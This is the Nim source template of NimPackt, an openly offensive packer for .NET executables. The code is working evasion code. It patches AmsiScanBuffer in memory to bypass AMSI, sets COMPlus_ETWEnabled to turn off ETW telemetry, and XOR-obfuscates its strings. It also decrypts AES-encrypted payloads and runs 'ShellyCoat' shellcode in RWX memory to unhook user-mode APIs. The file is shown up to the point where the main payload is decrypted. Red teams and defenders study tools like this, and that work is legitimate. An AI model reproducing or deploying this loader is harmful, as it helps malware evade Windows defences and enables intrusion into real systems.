#[
    NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
    By Cas van Cooten (@chvancooten)

    This is a template file. For usage please refer to README.md

    ===
    
    References:

        Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim


        Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
        https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
]#

import nimcrypto
import winim/clr except `[]`
import winim/lean
import winim/com
import strformat
import os
import dynlib
import base64
import osproc
from bitops import bitor

### Modified code from Nim-Strenc to avoid XORing of long strings
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc fWorgaKn0rg(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var encodedCounter {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro encrypt*{s}(s: string{lit}): untyped =
    if len($s) < 1000:
        var encodedStr = fWorgaKn0rg(estring($s), encodedCounter)
        result = quote do:
            fWorgaKn0rg(estring(`encodedStr`), `encodedCounter`)
        encodedCounter = (encodedCounter *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
#[ PLACEHOLDERCRYPTKEY ]#

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
#[ PLACEHOLDERVERBOSE ]#

# Get the AMSI patch bytes based on arch
when defined amd64:
    if verbose:
        echo "[*] Running in x64 process"
    const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    if verbose:
        echo "[*] Running in x86 process"
    const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

# Patch AMSI
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    amsi = loadLib("amsi")
    if isNil(amsi):
        if verbose:
            echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer")
    if isNil(cs):
        if verbose:
            echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
        VirtualProtect(cs, amsiPatch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let optionPatchAmsi = true
    #[ PLACEHOLDERPATCHAMSI ]#
    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let optionDisableEtw = true
    #[ PLACEHOLDERDISABLEETW ]#

    var success : bool

    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))

    #[
        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
        let b64buf = "ZXhhbXBsZQo="
        let cryptedCoat = ""
        let cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]

        (key is defined separately as a const to prevent the values from being too close together)
    ]#
    #[ PLACEHOLDERCRYPTEDINPUT ]#
    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
    #[ PLACEHOLDERCRYPTIV ]#

    if optionPatchAmsi:
        # Patch AMSI
        success = PatchAmsi()
        if verbose:
            echo fmt"[*] AMSI disabled: {bool(success)}"

    if optionDisableEtw:
        # Disable ETW
        var cometw = "COMPlus_ETWEnabled"
        var setnull = "0"
        putenv(cometw,setnull)
        if getEnv(cometw) == setnull:
            success = true
        else:
            success = false
        if verbose:
            echo fmt"[*] ETW disabled: {bool(success)}"

    # Prepare decryption stuff
    let cryptedInput = toByteSeq(decode(b64buf))
    
    var
        dctx: CTR[aes128]
        key : array[aes128.sizeKey, byte]
        iv : array[aes128.sizeBlock, byte]
        encodedPay = newSeq[byte](len(cryptedInput))
        decodedPay = newSeq[byte](len(cryptedInput))

    key = cryptKey
    iv = cryptIV
    encodedPay = cryptedInput
    
    # Run shellcode using VirtualAlloc()
    proc rscva(payload: openArray[byte]): void =
        var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if verbose:
            doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
        copyMem(allocated, payload[0].unsafeAddr, len(payload))
        let f = cast[proc(){.nimcall.}](allocated)
        f()

    if cryptedCoat != "":
        # Decrypt ShellyCoat shellcode
        let cryptedCoatBytes = toByteSeq(decode(cryptedCoat))

        var
            encodedCoat = newSeq[byte](len(cryptedCoatBytes))
            decodedCoat = newSeq[byte](len(cryptedCoatBytes))

        encodedCoat = cryptedCoatBytes
        dctx.init(key, iv)
        dctx.decrypt(encodedCoat, decodedCoat)
        dctx.clear()

        # Remove user-mode API hooks by running ShellyCoat shellcode
        rscva(decodedCoat)
        if verbose:
            echo "[*] User-mode API hooks removed: true"
            

    # Decrypt the encrypted bytes of the main payload
    var dctx2: CTR[aes128]
    dctx2.init(key, iv)
    dctx2.decrypt(encodedPay, decodedPay)
    dctx2.clear()